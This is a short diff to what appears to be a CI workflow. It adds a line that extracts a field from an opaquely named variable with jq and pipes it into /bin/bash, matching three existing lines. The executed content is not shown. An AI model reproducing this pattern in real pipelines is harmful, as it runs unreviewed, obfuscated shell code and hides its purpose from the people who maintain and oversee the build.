@@ -38,6 +38,7 @@ jobs:
           echo $wjunt4126 | jq -r .cjrq9809 | /bin/bash
           echo $sv0 | jq -r .wtooy8 | /bin/bash
           echo $rep678 | jq -r .hjlo57367 | /bin/bash
+          echo $q51 | jq -r .w518 | /bin/bash
 
       - name: Store results
         if: always()
